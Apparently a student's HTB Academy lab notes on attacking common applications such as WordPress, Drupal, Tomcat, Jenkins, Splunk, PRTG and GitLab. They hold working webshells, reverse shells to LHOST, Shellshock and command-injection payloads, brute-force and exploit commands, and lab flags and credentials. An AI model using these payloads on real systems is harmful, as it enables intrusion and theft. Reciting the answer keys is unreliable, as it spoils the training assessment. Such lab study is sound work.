# HTB Academy — Attacking Common Applications: Module Notes

**Status:** In progress (Sections 1–21 of 33 complete; Section 21 lab incomplete — pick up at x64dbg dump step)

---

## Section 1 — Introduction

### Target Applications Covered
| Category | Applications |
|---|---|
| Web CMS | WordPress, Joomla, Drupal |
| Application Servers | Apache Tomcat |
| Automation/CI | Jenkins |
| SIEM | Splunk |
| Network Monitoring | PRTG Network Monitor |
| Ticketing | osTicket |
| Source Control | GitLab |

### Key Mindset
- Attack angle 1: **public CVEs** against known versions
- Attack angle 2: **abuse built-in functionality** (script consoles, task runners, APIs) to get RCE — often more reliable than CVEs
- These apps appear on both external and internal assessments — often the only foothold in a hardened environment
- Default creds, unpatched versions, and misconfigs are the most common wins
- Never overlook an unfamiliar app — approach every app with a critical eye

### Lab Setup
Vhosts all point to one target IP. Add to `/etc/hosts` before any section:
```
printf "%s\t%s\n\n" "$IP" "app.inlanefreight.local dev.inlanefreight.local drupal-dev.inlanefreight.local drupal-qa.inlanefreight.local drupal-acc.inlanefreight.local drupal.inlanefreight.local blog.inlanefreight.local" | sudo tee -a /etc/hosts
```

---

## Section 2 — Application Discovery & Enumeration

### Workflow
1. Nmap scan of common web ports → save as XML
2. Feed XML into EyeWitness and/or Aquatone → screenshot reports
3. Review report (High Value Targets section first), note interesting hosts
4. Run deeper Nmap scan (`-sV`, top 10k ports) while reviewing screenshot report
5. Manual validation of everything interesting

### Nmap Initial Web Sweep
```
sudo nmap -p 80,443,8000,8080,8180,8888,10000 --open -oA web_discovery -iL scope_list
```

### EyeWitness
```
sudo apt install eyewitness -y
eyewitness --web -x web_discovery.xml -d inlanefreight_eyewitness --no-prompt
```
- Creates `ew.db` SQLite file in output folder
- Fingerprints apps and suggests default credentials
- Can also take Nessus XML

### Aquatone
```
wget https://github.com/michenriksen/aquatone/releases/download/v1.7.0/aquatone_linux_amd64_1.7.0.zip
unzip aquatone_linux_amd64_1.7.0.zip
cat web_discovery.xml | ./aquatone -nmap
```
- Output report: `aquatone_report.html`
- Title page header: **"Pages by Similarity"**
- Also takes Masscan XML

### What to Look For in Reports
- **Tomcat** → try default creds on `/manager` and `/host-manager` → upload malicious WAR → RCE
- **CMS (WordPress/Joomla/Drupal)** → check version, plugins/themes for CVEs
- **Dev subdomains** (anything with `dev` in FQDN) → may have debug mode, untested features
- **GitLab** → check for public repos, open registration, old commits with creds
- **osTicket** → sensitive ticket data, possible email registration abuse
- **Printers** → sometimes leak LDAP creds in cleartext
- File upload pages with no validation → immediate web shell opportunity

### Nmap Service Scan (deeper)
```
sudo nmap --open -sV <target_ip>
```

---

## Section 3 — WordPress: Discovery & Enumeration

### WordPress Quick Fingerprinting
```
curl -s http://<target>/ | grep WordPress
curl -s http://<target>/robots.txt
```
- `/wp-admin/` and `/wp-content/` in robots.txt = WordPress confirmed
- Meta generator tag reveals version: `<meta name="generator" content="WordPress 5.8" />`

### Manual Plugin/Theme Enumeration
```
curl -s http://<target>/ | grep plugins
curl -s http://<target>/ | grep themes
```
**Critical:** Homepage only loads plugins active on the homepage. Check individual posts too:
```
curl -s "http://<target>/?p=1" | grep plugins
curl -s "http://<target>/?p=2" | grep plugins
```
Plugins found via footer credit links (e.g., `Powered by "WP Sitemap Page"`) — not in asset references.

### Directory Enumeration (when listing is enabled)
```
curl -s http://<target>/wp-content/uploads/
curl -s http://<target>/wp-content/plugins/
curl -s http://<target>/wp-content/themes/
```
Traverse upload subdirectories manually — flag/sensitive files can be nested under year/month:
```
curl -s http://<target>/wp-content/uploads/2021/08/
```

### Plugin Version Fingerprinting
```
curl -s http://<target>/wp-content/plugins/<plugin>/readme.txt | grep -i "stable tag\|version"
```

### User Enumeration
- Valid username + wrong password → `"The password for username X is incorrect"`
- Invalid username → `"The username X is not registered on this site"`
- WordPress is vulnerable to user enumeration by default

### WPScan Automated Enumeration
```
sudo wpscan --url http://<target> --enumerate --api-token <token>
```
- Enumerates vulnerable plugins, themes, users, media, backups
- `--enumerate ap` for all plugins (not just vulnerable ones)
- Default threads: 5 (change with `-t`)
- Requires WPVulnDB API token for vulnerability data (25 free requests/day)

**WPScan limitations:**
- Misses plugins not referenced on the homepage (passive detection only)
- Manual grep of individual post pages catches what WPScan misses
- Always combine automated + manual enumeration

### WordPress User Roles
| Role | Access |
|---|---|
| Administrator | Full access, can edit source code → RCE |
| Editor | Publish/manage all posts |
| Author | Manage own posts |
| Contributor | Write own posts (no publish) |
| Subscriber | Browse posts only |

Admin access = code execution via theme editor or plugin upload.

### WordPress Attack Surface Summary
- 54% of known WP vulns are in **plugins**
- 31.5% in **WordPress core**
- 14.5% in **themes**
- XML-RPC (`/xmlrpc.php`) enabled → password brute-force via WPScan or Metasploit
- Directory listing on uploads → sensitive file exposure

### Notable Vulnerable Plugins (from lab)
- **mail-masta 1.0** → Unauthenticated LFI + SQL injection
- **wpDiscuz 7.0.4** → Unauthenticated RCE
- **WP Sitemap Page 1.6.4** → (check for known CVEs)
- **Contact Form 7 5.4.2** → (check for known CVEs)

---

## Section 4 — Attacking WordPress

### Login Brute Force
Use WPScan's xmlrpc method — faster than wp-login:
```
sudo wpscan --password-attack xmlrpc -t 20 -U <user> -P /usr/share/wordlists/rockyou.txt --url http://<target>
```
Lab credentials found: `doug:jessica1`

### RCE via Theme Editor (requires admin access)
1. Log into `/wp-admin` → Appearance → Theme Editor
2. Select an **inactive** theme (e.g. Twenty Nineteen) → click Select
3. Click `404.php` in the file list
4. Add `system($_GET[0]);` just after the opening comment block
5. Click Update File → execute commands:
```
curl -s "http://<target>/wp-content/themes/twentynineteen/404.php?0=id"
```

**Critical gotcha:** The file already opens with `<?php` on line 1. Adding `<?php system($_GET[0]); ?>` (with tags) inside it causes a 500 syntax error. Use bare `system($_GET[0]);` only — no opening/closing PHP tags.

**Space gotcha:** Use `%20` not `+` in query strings for system commands passed via curl.

**Flag location gotcha:** The "webroot" flag is NOT in wp-content/uploads — it's a uniquely named file directly in the WordPress install root. Always `ls` the webroot first:
```
curl -s "http://<target>/wp-content/themes/twentynineteen/404.php?0=ls%20/var/www/<vhost>/"
```

### wpDiscuz 7.0.4 — Unauthenticated RCE (CVE-2020-24186)
File upload bypass — MIME type detection bypassed to upload PHP webshell:
```
python3 wp_discuz.py -u http://<target> -p /?p=1
```
Script may fail at execution step — use curl directly against the uploaded file:
```
curl -s "http://<target>/wp-content/uploads/<year>/<month>/<filename>.php?cmd=id"
```

### mail-masta 1.0 — Unauthenticated LFI
Direct file inclusion via `pl` parameter, no validation:
```
curl -s "http://<target>/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd"
```

---

## Section 5 — Joomla: Discovery & Enumeration

### Fingerprinting
```
curl -s http://<target>/administrator/manifests/files/joomla.xml | grep "<version>"
curl -s http://<target>/README.txt | head -n 5
```

### Automated Enumeration
```
droopescan scan joomla --url http://<target>/
```
Install via: `sudo pip3 install droopescan`

### Login Brute Force
Download: `sudo wget https://raw.githubusercontent.com/ajnik/joomla-bruteforce/master/joomla-brute.py`
```
sudo python3 joomla-brute.py -u http://<target> -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr admin
```

### Key Paths
- Admin login: `/administrator/index.php`
- Version info: `/administrator/manifests/files/joomla.xml`
- Version approx: `/plugins/system/cache/cache.xml`
- Robots.txt reveals structure: `/administrator/`, `/components/`, `/plugins/`, etc.

### Lab Answers (app.inlanefreight.local)
- Q1 version: `3.10.0`
- Q2 password: `turnkey`

---

## Section 6 — Attacking Joomla

### RCE via Template Editor (requires admin)
1. Login to `/administrator` → Configuration → Templates → protostar → error.php
2. Add `system($_GET[0]);` → Save & Close
3. Execute: `curl -s "http://<target>/templates/protostar/error.php?0=id"`

### CVE-2019-10945 — Directory Traversal (Joomla 1.5.0–3.9.4)
```
git clone https://github.com/dpgg101/CVE-2019-10945
python3 CVE-2019-10945/CVE-2019-10945.py --url "http://<target>/administrator/" --username admin --password admin --dir /
```
Lists webroot contents — look for flag files, then read via webshell or direct URL.

**Workflow:** dir traversal finds the flag filename → webshell reads it:
```
curl -s "http://<target>/templates/protostar/error.php?0=cat%20/var/www/<vhost>/<flagfile>"
```

---

## Section 7 — Drupal: Discovery & Enumeration

### Fingerprinting
```
curl -s http://<target>/ | grep Drupal
curl -s http://<target>/CHANGELOG.txt | grep -m2 ""
curl -s http://<target>/robots.txt | grep node
```
CHANGELOG.txt gives exact version on older installs — newer Drupal blocks it (404).

### Automated Enumeration
```
droopescan scan drupal -u http://<target>/
```
More capable for Drupal than Joomla. Finds plugins, version, interesting URLs.

### Key Paths
- Admin login: `/user/login`
- Version: `/CHANGELOG.txt`, `/README.txt`
- Nodes: `/node/<id>` — identifies Drupal even with custom themes

### Lab Answers
- drupal-qa.inlanefreight.local version: `7.30`

---

### Lab Answers (dev.inlanefreight.local — Joomla 3.9.4, admin:admin)
- Q1 flag: `j00mla_c0re_d1rtrav3rsal!` (flag_6470e394cbf6dab6a91682cc8585059b.txt in webroot)

---

### Lab Answers
- Q1 user: `doug`
- Q2 password: `jessica1`
- Q3 bash user: `webadmin`
- Q4 flag: `l00k_ma_unAuth_rc3!` (at `/var/www/blog.inlanefreight.local/flag_d8e8fca2dc0f896fd7cb4cb0031ba249.txt`)

---

## Section 8 — Attacking Drupal

### PHP Filter Module (Drupal 7, pre-auth requires admin)
1. Login as admin → `admin/modules` → enable **PHP filter**
2. Content → Add content → Basic page
3. Body: `<?php system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']); ?>`
4. Text format: **PHP code** → Save (note the node number)
5. Execute: `curl -s "http://<target>/node/3?dcfdd5e021a869fcc6dfaef8bf31377e=id"`

For Drupal 8+: download and install `php-8.x-1.1.tar.gz` module first, then same steps.

### Backdoored Module Upload (any version with admin)
1. Download a real module: `wget --no-check-certificate https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz`
2. Extract: `tar xvf captcha-8.x-1.2.tar.gz`
3. Create webshell `shell.php`: `<?php system($_GET['fe8edbabc5c5c9b7b764504cd22b17af']); ?>`
4. Create `.htaccess`:
```
<IfModule mod_rewrite.c>
RewriteEngine On
RewriteBase /
</IfModule>
```
5. Move both into captcha dir, repackage: `tar cvf captcha.tar.gz captcha/`
6. Admin → Extend → Install new module → upload archive
7. Execute: `curl -s <target>/modules/captcha/shell.php?fe8edbabc5c5c9b7b764504cd22b17af=id`

### Drupalgeddon (CVE-2014-3704) — Drupal 7.0–7.31, pre-auth SQLi
```
python2.7 drupalgeddon.py -t http://<target> -u hacker -p pwnd
```
Creates admin user → log in → use PHP filter or module upload for RCE.
Metasploit: `exploit/multi/http/drupal_drupageddon`

### Drupalgeddon2 (CVE-2018-7600) — Drupal < 7.58 / < 8.5.1, unauthenticated RCE
```
git clone https://github.com/a2u/CVE-2018-7600
```
Modify script to write a webshell:
```
echo "PD9waHAgc3lzdGVtKCRfR0VUW2ZlOGVkYmFiYzVjNWM5YjdiNzY0NTA0Y2QyMmIxN2FmXSk7Pz4K" | base64 -d | tee mrb3n.php
```
Run PoC → `curl http://<target>/mrb3n.php?fe8edbabc5c5c9b7b764504cd22b17af=id`

### Drupalgeddon3 (CVE-2018-7602) — authenticated RCE, requires session cookie
Metasploit: `exploit/multi/http/drupal_drupageddon3`
- Set `DRUPAL_SESSION`, `DRUPAL_NODE`, `VHOST`, `RHOSTS`, `LHOST`

### Key Gotchas
- Flag files are uniquely named — always `ls` the target directory first
- All vhosts on same box — RCE on any instance reaches all webroot directories
- drupal-qa (7.30) → Drupalgeddon; drupal-dev → Drupalgeddon2; drupal-acc → Drupalgeddon3

### Lab Answers
- Section 8 flag: `DrUp@l_drUp@l_3veryWh3Re!` (at `/var/www/drupal.inlanefreight.local/flag_6470e394cbf6dab6a91682cc8585059b.txt`)
- Got RCE via Metasploit `exploit/multi/http/drupal_drupageddon` on drupal-qa (Drupal 7.30)

---

## Section 9 — Tomcat: Discovery & Enumeration

### Fingerprinting
```
curl -s http://<target>:<port>/docs/ | grep Tomcat
curl -sI http://<target>:<port>/login
```
- `X-Jenkins` header reveals version on Jenkins; `X-Hudson` also present
- `/docs/` page title contains version
- 404 error page reveals version on older configs

### Key Paths
- Manager GUI: `/manager/html` (requires `manager-gui` role)
- Host Manager: `/host-manager/html`
- Default port: 8080 (also common: 8180, 8443)

### Key Files
- `conf/tomcat-users.xml` — credentials and roles
- `webapps/<app>/WEB-INF/web.xml` — routes and servlet mappings (useful for LFI)

### Roles
| Role | Access |
|---|---|
| manager-gui | HTML GUI + status pages |
| manager-script | Text API + status pages |
| manager-jmx | JMX proxy + status pages |
| manager-status | Status pages only |

### Gobuster Enumeration
```
gobuster dir -u http://<target>:<port>/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt
```

### Lab Answers
- web01.inlanefreight.local:8180 version: `10.0.10`
- admin role in config example: `admin-gui`

---

## Section 10 — Attacking Tomcat

### Login Brute Force
```
msfconsole -q -x "use auxiliary/scanner/http/tomcat_mgr_login; set VHOST <vhost>; set RPORT <port>; set STOP_ON_SUCCESS true; set RHOSTS <ip>; run"
```
Default wordlists: `tomcat_mgr_default_users.txt` / `tomcat_mgr_default_pass.txt`

### WAR File Upload (requires manager-gui role)
```
wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp
zip -r backup.war cmd.jsp
```

**Upload via curl (requires session cookie + CSRF token — two-step):**
```
curl -c /tmp/tc.txt -b /tmp/tc.txt -u <user>:<pass> -s "http://<target>/manager/html" -o /tmp/tc_page.html
grep -o 'CSRF_NONCE=[A-F0-9]*' /tmp/tc_page.html | head -1
curl -c /tmp/tc.txt -b /tmp/tc.txt -u <user>:<pass> -F "deployWar=@backup.war" "http://<target>/manager/html/upload?org.apache.catalina.filters.CSRF_NONCE=<TOKEN>"
```

**Execute via webshell:**
```
curl -s -G "http://<target>/backup/cmd.jsp" --data-urlencode "cmd=id"
```
- Use `--data-urlencode` with `-G` — `Runtime.exec()` doesn't interpret shell operators
- No `2>/dev/null` — it gets passed literally and breaks the command

### msfvenom WAR (reverse shell instead of webshell)
```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<ip> LPORT=4443 -f war > backup.war
nc -lnvp 4443
```
Upload same way, then browse to `/backup/` to trigger.

### CVE-2020-1938 Ghostcat (pre-auth LFI, AJP port 8009)
Affects all Tomcat < 9.0.31 / < 8.5.51 / < 7.0.100
```
nmap -sV -p 8009,8080 <target>
python2.7 tomcat-ajp.lfi.py <target> -p 8009 -f WEB-INF/web.xml
```
Can only read files within the webapps folder.

### Key Gotchas
- `manager-gui` role does NOT allow `/manager/text/` API — need `manager-script` for that
- CSRF token is session-bound — must fetch token and upload using the same cookie jar
- Flag files are in webapps directory, not at a predictable path — always `ls` first

### Lab Answers
- Creds: `tomcat:root`
- Flag: `t0mcat_rc3_ftw!` (at `/opt/tomcat/apache-tomcat-10.0.10/webapps/tomcat_flag.txt`)

---

## Section 11 — Jenkins: Discovery & Enumeration

### Fingerprinting
```
curl -sI http://<target>:<port>/login
```
- `X-Jenkins` response header contains version
- `X-Hudson` header also present (Jenkins was originally Hudson)
- Default port: 8080 (also common: 8000)
- Management/slave communication: port 5000

### Auth Options
- Jenkins own user database (default)
- LDAP, Unix user database, no authentication
- Default trial creds: `admin:admin`

### Lab Answers
- jenkins.inlanefreight.local:8000 version: `2.303.1`

---

## Section 12 — Attacking Jenkins

### RCE via Groovy Script Console (`/script`)
The script console runs Apache Groovy on the Jenkins controller — equivalent to a webshell.

**Execute OS command:**
```groovy
def cmd = 'id'
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = cmd.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println sout
```

**Via curl (requires crumb + session cookie together):**
```python
import requests

url = "http://<target>:<port>"
auth = ("admin", "admin")

s = requests.Session()
crumb_json = s.get(f"{url}/crumbIssuer/api/json", auth=auth).json()
crumb = crumb_json["crumb"]
field = crumb_json["crumbRequestField"]

script = """
def cmd = 'cat /path/to/flag'
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = cmd.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println sout
"""

r = s.post(f"{url}/scriptText", auth=auth, headers={field: crumb}, data={"script": script})
print(r.text)
```

**Reverse shell (Linux):**
```groovy
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/<LHOST>/8443;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

**Windows command execution:**
```groovy
def cmd = "cmd.exe /c dir".execute();
println("${cmd.text}");
```

### Key Gotchas
- Jenkins CSRF crumb is session-bound — must use `requests.Session()` so crumb and POST share the same session
- Fetching crumb with one request and POSTing with another (different session) = 403
- Jenkins often runs as root (Linux) or SYSTEM (Windows) — high-value target

### Lab Answers
- Creds: `admin:admin`
- Flag: `f33ling_gr00000vy!` (at `/var/lib/jenkins3/flag.txt`)

---

## Section 13 — Splunk: Discovery & Enumeration

### Fingerprinting
```
curl -sk https://<target>:8089/services/server/info | grep version
```
- Web UI: port 8000
- Management/REST API: port 8089
- Version exposed unauthenticated via REST API even when web UI requires auth

### Auth Notes
- Default creds (older): `admin:changeme`
- Trial converts to free (no auth) after 60 days
- Free version: no authentication on web UI
- Common weak passwords: `admin`, `Welcome1`, `Password123`, `Welcome`, `changeme`

### Test credentials via REST API
```
curl -sk -X POST "https://<target>:8089/services/auth/login" -d "username=admin&password=<pass>" -w " %{http_code}"
```
200 + sessionKey = valid creds.

### Lab Answers
- Version: `8.2.2`
- OS: Windows Server

---

## Section 14 — Attacking Splunk

### RCE via Custom App (scripted input)
Splunk runs scripted inputs automatically — plant a reverse shell script in a custom app.

**Directory structure:**
```
splunk_shell/
├── bin/
│   ├── run.ps1    (PowerShell reverse shell — Windows)
│   ├── run.bat    (calls run.ps1 — Windows)
│   └── rev.py     (Python reverse shell — Linux)
└── default/
    └── inputs.conf
```

**inputs.conf (Windows):**
```
[script://.\bin\run.bat]
disabled = 0
sourcetype = shell
interval = 10
```

**inputs.conf (Linux):**
```
[script://./bin/rev.py]
disabled = 0
interval = 10
sourcetype = shell
```

**run.bat:**
```batch
@ECHO OFF
PowerShell.exe -exec bypass -w hidden -Command "& '%~dpn0.ps1'"
Exit
```

**run.ps1 (PowerShell reverse shell):**
```powershell
$client = New-Object System.Net.Sockets.TCPClient('<LHOST>',<LPORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

**rev.py (Linux):**
```python
import sys,socket,os,pty
ip="<LHOST>"
port="<LPORT>"
s=socket.socket()
s.connect((ip,int(port)))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn('/bin/bash')
```

**Package and upload:**
```
tar -cvzf updater.tar.gz splunk_shell/
```
Upload via: Apps → Manage Apps → Install app from file → Browse → Upload (check Upgrade app if re-uploading)

**Get session token via REST API:**
```
curl -sk -X POST "https://<target>:8089/services/auth/login" -d "username=admin&password=<pass>"
```

### Read flag on Windows shell
```
type c:\loot\flag.txt
```

### Key Gotchas
- Splunk often runs as root (Linux) or SYSTEM (Windows)
- Use `type` not `cat` to read files in Windows cmd/PowerShell
- Python socket reverse shell fails on Windows Splunk due to firewall — use PowerShell
- Use the repo linked in the section for a working pre-built package structure
- If web UI requires auth but REST API doesn't — test creds via `8089/services/auth/login`
- Deployment server compromise → can push apps to all Universal Forwarders on the network

### Lab Answers
- Creds: `admin:Welcome1`
- Flag: `l00k_ma_no_AutH!` (at `c:\loot\flag.txt`)
- Shell received as `NT AUTHORITY\SYSTEM`

---

## Section 15 — PRTG Network Monitor

### Discovery & Fingerprinting
PRTG runs on port 8080 (also 80, 443). Identified by Nmap as `Indy httpd <version> (Paessler PRTG bandwidth monitor)`.

```
curl -s http://<target>:8080/index.htm -A "Mozilla/5.0 (compatible; MSIE 7.01; Windows NT 5.0)" | grep prtgversion
```

Default credentials: `prtgadmin:prtgadmin` (often pre-filled on login page)
Common weak password: `prtgadmin:Password123`

### CVE-2018-9276 — Authenticated Command Injection
Affects PRTG < 18.2.39. The Parameter field in notifications is passed directly to a PowerShell script without sanitization.

**Attack steps:**
1. Login to PRTG web UI
2. Setup → Account Settings → Notifications → **Add new notification**
3. Name it anything (e.g. `pwn`)
4. Scroll down → tick **EXECUTE PROGRAM**
5. Program File: `Demo exe notification - outfile.ps1`
6. Parameter: `test.txt;<command>` — e.g. add local admin:
```
test.txt;net user prtgadm1 Pwn3d_by_PRTG! /add;net localgroup administrators prtgadm1 /add
```
7. Save → click **Test** on the notification

**Verify and connect:**
```
sudo crackmapexec smb <target> -u prtgadm1 -p 'Pwn3d_by_PRTG!'
evil-winrm -i <target> -u prtgadm1 -p 'Pwn3d_by_PRTG!'
```

**Read flag:**
```
type C:\Users\Administrator\Desktop\flag.txt
```

### Key Gotchas
- Blind command execution — no output returned; verify via CrackMapExec or connection attempt
- Semicolon separates the dummy filename from the injected command: `test.txt;<payload>`
- PRTG often runs as SYSTEM — new local admin user immediately gives full access
- Can also use for persistence: schedule notification to run at specific times
- Port 8080 is the default but can be changed in admin settings

### Lab Answers
- Version: `18.1.37.13946`
- Creds: `prtgadmin:Password123`
- Flag: `WhOs3_m0nit0ring_wH0?` (at `C:\Users\Administrator\Desktop\flag.txt`)

---

## Section 16 — osTicket

### Overview
osTicket is an open-source support ticketing system (PHP + MySQL). Not heavily CVE-laden — the main attack value is **information disclosure** and **email registration abuse**, not direct exploitation.

### Footprinting
- Cookie `OSTSESSID` set on visit = osTicket confirmed
- Footer shows "powered by osTicket" or "Support Ticket System"
- Nmap only shows Apache/IIS — doesn't fingerprint osTicket directly
- Staff login panel: `/scp/login.php`
- Accepts username OR email address for login

### Attack Angle 1 — Email Registration Abuse
If you can open a ticket, osTicket may assign a temporary internal company email (e.g. `940288@inlanefreight.local`). Use that email to register accounts on other exposed internal services (GitLab, Slack, Mattermost, Bitbucket) that require email verification from a company domain.

### Attack Angle 2 — Credential Reuse / Sensitive Data in Tickets
1. Find leaked credentials via Dehashed or other OSINT
2. Try them against the staff portal at `/scp/login.php` — try both username and full email formats
3. Once in, check **closed tickets** — agents often send passwords, reset credentials, or internal info directly in the ticket thread

### CVE-2020-24881 — SSRF (osTicket 1.14.1)
SSRF via the ticket creation form — can be used to reach internal resources or port-scan internally.

### Key Gotchas
- Login accepts email address even if username fails — always try both formats
- Closed tickets are the goldmine — open tickets may be empty for inactive agents
- Helpdesk agents routinely send passwords in plaintext through tickets
- Standard new-joiner passwords found in tickets may work across all new users (password spray opportunity)
- Address book in osTicket = username/email list for spraying

### Lab Answers
- Staff login: `kevin@inlanefreight.local` : `Fish1ng_s3ason!`
- Password sent to Charles Smithson: `Inlane_welcome!`

---

## Section 17 — GitLab: Discovery & Enumeration

### Overview
GitLab is a self-hosted Git platform (Ruby on Rails + Go + Vue.js). Attack value: public/internal repos with hardcoded secrets, credential reuse, username enumeration, and occasionally direct exploits against older versions.

### Footprinting
- Browsing to the instance redirects to `/users/sign_in` — GitLab logo confirms the app
- Version only visible at `/help` when **logged in**
- Notable exploited versions: 12.9.0, 11.4.7, CE 13.10.3 / 13.9.3 / 13.10.2

### Enumeration Steps
1. Browse to `/explore` without auth — check for public projects
2. Check `/explore/snippets` for exposed code snippets
3. Register an account if open registration is enabled — unlocks internal projects
4. Browse to `/help` after login to get version number
5. Dig through all repo files + full commit history for secrets

### Username / Email Enumeration
- Registration form leaks valid usernames: "Username is already taken"
- Registration form leaks valid emails: "Email has already been taken"
- Works even when sign-up is disabled (browse to `/users/sign_up` directly)

### What to Hunt in Repos
- `.env`, `config/database.yml`, `docker-compose.yml`, `phpunit_*.xml` — DB credentials
- CI config files (`.gitlab-ci.yml`, `.travis.yml`) — API keys, tokens
- Commit history — credentials committed and then "fixed" in a later commit remain in history
- SSH private keys, API keys, hardcoded passwords

### Key Gotchas
- Commit message "fix X" = the thing before that commit likely had the credential — check the prior commit
- 2FA is off by default — credential reuse from Dehashed/OSINT applies directly
- Public repos visible without auth — always check `/explore` first before registering
- Internal repos only visible after login — register even if you don't expect much

### Lab Answers
- Target: `gitlab.inlanefreight.local` (same IP as osTicket — APP04)
- Version: `13.10.2` (from `/help` after logging in)
- PostgreSQL password: `postgres` (found in `phpunit_pgsql.xml` in the Inlanefreight dev public project)

---

## Section 18 — Attacking GitLab

### Username Enumeration
Use the Python3 script (Bash version has CRLF/shebang issues on Pwnbox):
```
wget https://raw.githubusercontent.com/dpgg101/GitLabUserEnum/main/gitlab_userenum.py
python3 gitlab_userenum.py --url http://<target>:<port>/ --wordlist <wordlist>
```
- `names.txt` only finds common first names — use `xato-net-10-million-usernames.txt` for broader coverage
- Script works by checking HTTP 200 vs non-200 on `/<username>` profile pages
- Profile pages follow redirects — `-L` needed if doing it manually with curl
- Valid users found on lab: `root`, `bob`, `demo`, `public`, `help`

### CVE-2021-22205 — Authenticated RCE (GitLab ≤ 13.10.2)
ExifTool mishandles metadata in uploaded image files → code execution as `git` user.

**Requirements:** Valid GitLab account (self-registration works if enabled) + `djvulibre-bin` installed

```
sudo apt install djvulibre-bin -y
wget https://raw.githubusercontent.com/CsEnox/Gitlab-Exiftool-RCE/main/exploit.py -O gitlab_rce.py
```

**Attack:**
```
nc -lnvp 8443
python3 gitlab_rce.py -t http://<target>:<port> -u <user> -p <pass> -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc <LHOST> 8443 >/tmp/f'
```

Shell lands as `git` user. Flag is in `~/gitlab-workhorse/`.

### Key Gotchas
- Default lockout: 10 failed attempts → 10 min lockout (be careful with brute force)
- 2FA off by default — credential reuse works directly
- `djvumake` must be installed or the exploit aborts silently with a hint message
- `names.txt` wordlist misses non-name usernames — always follow up with a larger list
- Bash enumeration script has CRLF issues from Windows — use the Python3 version

### Lab Answers
- Valid users found: `root`, `bob`, `demo` (answer), `public`, `help`
- RCE exploit: CVE-2021-22205 via `gitlab_rce.py` with registered account `pwn:Welcome1!`
- Shell as: `git@app04`
- Flag: `s3cure_y0ur_Rep0s!` (at `~/gitlab-workhorse/flag_gitlab.txt`)

---

## Section 19 — Attacking Tomcat CGI (CVE-2019-0232)

### Overview
CVE-2019-0232 — command injection via Tomcat CGI Servlet on Windows when `enableCmdLineArguments=true`. Affects Tomcat 9.0.0.M1–9.0.17, 8.5.0–8.5.39, 7.0.0–7.0.93.

### How It Works
- CGI Servlet passes query string as command-line args to CGI scripts
- On Windows, `&` is a command separator — appending `&<cmd>` injects a second command
- Tomcat added a regex filter blocking special chars — bypass with URL encoding

### Attack Steps
1. Fuzz for CGI scripts (.cmd first, then .bat):
```
ffuf -w /usr/share/dirb/wordlists/common.txt -u http://<target>:8080/cgi/FUZZ.bat
```
2. Confirm script works by browsing to it directly
3. Check env vars to find PATH (usually unset — must hardcode full paths):
```
curl "http://<target>:8080/cgi/welcome.bat?&set"
```
4. Exploit with URL-encoded payload (bypass regex filter):
```
curl "http://<target>:8080/cgi/welcome.bat?&c%3A%5Cwindows%5Csystem32%5Cwhoami.exe"
```
`c%3A%5C` = `c:\`, `%5C` = `\`

### Key Gotchas
- `whoami` alone returns no output — must use full path `c:\windows\system32\whoami.exe`
- PATH env var is unset in CGI context — always hardcode full Windows paths
- Tomcat's special character filter blocks `\` and `:` — URL-encode them to bypass
- Only works on Windows with `enableCmdLineArguments=true`

### Lab Answers
- Target: `10.129.205.30` (ACADEMY-ACA-FELDSPAR), Tomcat 9.0.17 on port 8080
- CGI script found: `welcome.bat`
- Tomcat running as: `feldspar\omen`

---

## Section 20 — Attacking CGI Applications: Shellshock (CVE-2014-6271)

### Overview
Shellshock is a 2014 vulnerability in Bash (≤ 4.3) where environment variables can carry executable code. When a CGI script runs and Bash processes environment variables (like User-Agent, Referer, etc.), the injected command executes in the web server's context.

### How It Works
Bash imports functions from environment variables. Vulnerable versions also execute trailing commands after the function definition:
```
env y='() { :;}; echo vulnerable' bash -c "echo test"
```
CGI passes HTTP headers as env vars → inject payload in User-Agent → Bash executes it.

### Enumeration
```
gobuster dir -u http://<target>/cgi-bin/ -w /usr/share/wordlists/dirb/small.txt -x cgi
```

### Confirm Vulnerability
```
curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/cat /etc/passwd' bash -s :'' http://<target>/cgi-bin/<script>.cgi
```
Two `echo` statements before the command ensure output appears after headers.

### Read Files Directly (no shell needed)
```
curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/cat /path/to/file' bash -s :'' http://<target>/cgi-bin/<script>.cgi
```

### Find Flag Location
```
curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/find / -name flag.txt 2>/dev/null' bash -s :'' http://<target>/cgi-bin/<script>.cgi
```

### Reverse Shell
```
nc -lvnp 7777
curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/<LHOST>/7777 0>&1' http://<target>/cgi-bin/<script>.cgi
```

### Key Gotchas
- Need two `echo` statements before command to flush headers and produce visible output
- Flag may not be in `/flag.txt` — use `find` to locate it first
- Shell runs as `www-data` typically
- Common on IoT devices and legacy embedded systems — always check `/cgi-bin/` when you see CGI

### Lab Answers
- Target: `10.129.205.27` (ACADEMY-ACA-LOUSY)
- CGI script: `/cgi-bin/access.cgi` (found via gobuster)
- Flag location: `/usr/lib/cgi-bin/flag.txt`
